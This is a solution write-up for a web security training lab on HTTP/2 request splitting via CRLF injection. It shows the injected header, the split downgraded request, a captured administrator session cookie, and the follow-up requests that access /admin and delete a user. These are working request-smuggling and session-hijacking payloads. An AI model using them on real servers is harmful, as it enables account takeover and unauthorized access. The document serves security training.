## HTTP/2 request splitting via CRLF injection

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.

To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 10 seconds.

The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection.

Hint :

To inject newlines into HTTP/2 headers, use the Inspector to drill down into the header, then press the Shift + Return keys. Note that this feature is not available when you double-click on the header.

## Notes

- Possibility to leave a comment
- Search page
- `/login`
- `/admin`

## Resume

1. Confirm that classic HTTP/1 request smuggling does not work.
2. Use CRLF injection in an HTTP/2 header to split the downgraded request.
3. Poison the back-end response queue with a smuggled request to a non-existent endpoint.
4. Capture an administrator login response containing a valid session cookie.
5. Reuse the stolen session cookie to access `/admin`.
6. Delete the user `carlos`.

## Solve

Classic HTTP/1 request smuggling does not work:

```http
POST / HTTP/1.1
Host: 0a9300530308e96680f18ae200980058.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
X-Ignore: x
```

The application is vulnerable through HTTP/2 request splitting instead.

Create an HTTP/2 request to a non-existent endpoint such as `/x` and inject CRLF characters inside a custom header value using Burp's HTTP/2 Inspector.

Header injected through the Inspector:

```
foo: bar\r\n
\r\n
GET /x HTTP/1.1\r\n
Host: 0a9300530308e96680f18ae200980058.web-security-academy.net
```

Resulting downgraded request:

```http
GET /x HTTP/2
Host: 0a9300530308e96680f18ae200980058.web-security-academy.net
foo: bar

GET /x HTTP/1.1
Host: 0a9300530308e96680f18ae200980058.web-security-academy.net
```

This causes the front-end server to generate two separate back-end requests and poisons the response queue.

Send the request repeatedly.

Most responses are your own:

```http
HTTP/2 404 Not Found
```

Eventually, a victim administrator login response is returned instead:

```http
HTTP/2 302 Found
Location: /my-account?id=administrator
Set-Cookie: session=3yHBtTXMPII0a0rom0DepQOztzFXD56A; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Administrator session captured:

```text
session=3yHBtTXMPII0a0rom0DepQOztzFXD56A
```

Use the stolen session cookie to access the admin panel:

```http
GET /admin HTTP/2
Host: 0a9300530308e96680f18ae200980058.web-security-academy.net
Cookie: session=3yHBtTXMPII0a0rom0DepQOztzFXD56A
```

The response contains the administrator interface and the deletion endpoint:

```http
/admin/delete?username=carlos
```

Delete the user:

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a9300530308e96680f18ae200980058.web-security-academy.net
Cookie: session=3yHBtTXMPII0a0rom0DepQOztzFXD56A
```

The lab is solved once `carlos` has been deleted.